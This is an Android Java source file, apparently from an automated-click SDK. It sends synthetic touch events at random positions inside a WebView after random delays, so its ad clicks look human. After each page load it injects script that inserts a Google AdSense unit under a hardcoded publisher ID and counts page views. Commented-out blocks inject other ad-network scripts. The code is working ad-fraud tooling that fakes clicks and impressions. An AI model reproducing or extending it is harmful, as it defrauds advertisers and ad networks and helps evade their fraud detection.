package dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.operation;

import android.os.Handler;
import android.os.SystemClock;
import android.util.Log;
import android.view.MotionEvent;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.common.SdkContext;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.robotium.SgSolo;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.LogUtil;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.OperationSleeper;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.RandomUtil;

/**
 * Created by sogood on 16/12/14.
 */

public class RandClickPositionOperation extends BaseOperation {

    private static final String TAG = RandClickPositionOperation.class.getSimpleName();

    private int mWidth;

    private int mHeight;

    private int mLeft;

    private int mTop;

    private int mRectWidth;

    private int mRectHeight;

    private int mMsgType;

    private int mRetryCount;

    private int mRand;

    private WebView mWebView;

    private boolean mJumpFinish;

    private int stayMin;

    private int stayMax;

    private String src;

    public RandClickPositionOperation(WebView webView, int rand, int width, int heigth, int left, int top,
              int rectWidth, int rectHeight, int retryCount, int msgType, int stayMin, int stayMax,String src) {
        mWebView = webView;
        mRand = rand;
        mWidth = width;
        mHeight = heigth;
        mLeft = left;
        mTop = top;
        mRectWidth = rectWidth;
        mRectHeight = rectHeight;
        mMsgType = msgType;
        mRetryCount = retryCount;
        this.stayMin = stayMin;
        this.stayMax = stayMax;
        this.src=src;
    }

    @Override
    public int doExecute(Handler handler, WebView webView, SgSolo solo) {

        LogUtil.i(TAG, "advertising 点击概率: " + mRand);
        if (!RandomUtil.isHit(mRand, 1000)) {
            LogUtil.i(TAG, "advertising 没中，不用进行点击");
            return JUMP;
        }

        final int x = RandomUtil.getRandom(mLeft, mLeft + mRectWidth);
        final int y = RandomUtil.getRandom(mTop, mTop + mRectHeight);
        int sleepTime = RandomUtil.getRandom(stayMin, stayMax);
        LogUtil.i(TAG, "advertising 睡眠" + sleepTime + "s后再点击");
        OperationSleeper.sleep(sleepTime * 1000);
        LogUtil.i(TAG, "advertising 即将点击 x=" + x + ", y=" + y);
        handler.post(new Runnable() {
            @Override
            public void run() {
                mWebView.setWebViewClient(new RandClickPositionOperation.MyWebViewClient());
                long downTime = SystemClock.uptimeMillis();
                final MotionEvent downEvent = MotionEvent.obtain(
                        downTime, downTime, MotionEvent.ACTION_DOWN,
                        x, y, 0);
                final MotionEvent upEvent = MotionEvent.obtain(
                        downTime, downTime, MotionEvent.ACTION_UP,
                        x, y, 0);
                mWebView.dispatchTouchEvent(downEvent);
                mWebView.dispatchTouchEvent(upEvent);
            }
        });

        //判断点击后是否有跳转成功,暂时定为有跳转成功该点击操作才算成功
        int loopTimes = 0;
        while (!mJumpFinish && loopTimes < (LOAD_WEB_TIMEOUT / OperationSleeper.sleepMiniDuration)) {
            OperationSleeper.sleepMini();
            loopTimes ++;
            LogUtil.i(TAG, "advertising load web finish = " + mJumpFinish + ", loopTimes = " + loopTimes);
        }

        return SUCC;
    }

    private class MyWebViewClient extends WebViewClient {

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            Log.i("lizhihao----","------------------------------------------------跳转啦~~~~~~~~~~"+url);
            LogUtil.i(TAG, "advertising RandClickOperation, onPageFinished, url = " + url);
            /**
            if(src!=null){
                String js = "var newscript = document.createElement(\"script\");";
                js += "newscript.src=\""+src+"\";";
                js += "document.body.appendChild(newscript);";
                mWebView.loadUrl("javascript:"+js);
            }
             **/
            mWebView.loadUrl("javascript:var scriptObj = document.createElement('script');scriptObj.src = '//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';document.body.appendChild(scriptObj);var divobj=document.createElement('div');divobj.setAttribute('style','position: fixed; z-index: 10; bottom: 0px; left: 50%; width: 412px; height: 100px; margin: 0px 0px 0px -206px; padding: 0px; border: 0px;');document.body.appendChild(divobj);var Obj = document.createElement('ins');Obj.setAttribute('class','adsbygoogle'); Obj.setAttribute('style','display:block;z-index:9999'); Obj.setAttribute('data-ad-client','ca-pub-8006791032730788');Obj.setAttribute('data-ad-slot','3397612355');Obj.setAttribute('data-ad-format','auto');divobj.appendChild(Obj);var scrip = document.createElement('script');scrip.innerHTML='(adsbygoogle = window.adsbygoogle || []).push({});';document.body.appendChild(scrip);");
/**
            mWebView.loadUrl("javascript:function testsd() {\n" +
                    "    var s = '_' + Math.random().toString(36).slice(2);\n" +
                    "    document.write('<div id=' + s + '></div>');\n" +
                    "    (window.slotbydup=window.slotbydup || []).push({\n" +
                    "        id: '3164463',\n" +
                    "        container: s,\n" +
                    "        size: '0,0',\n" +
                    "        display: 'inlay-fix'\n" +
                    "    });\n" +
                    "}testsd();var scriptObj = document.createElement('script');scriptObj.src = 'http://dup.baidustatic.com/js/om.js'; document.body.appendChild(scriptObj);");
 **/
          //  mWebView.loadUrl("javascript:var scriptObj = document.createElement('script');scriptObj.src = 'http://union.star-media.cn/smu0/o.js';scriptObj.setAttribute('smua','d=m&s=l&u=u2976385&h=20:8'); document.body.appendChild(scriptObj);");
            mJumpFinish = true;
            SdkContext.pageViewCount ++ ;
        }
    }

}
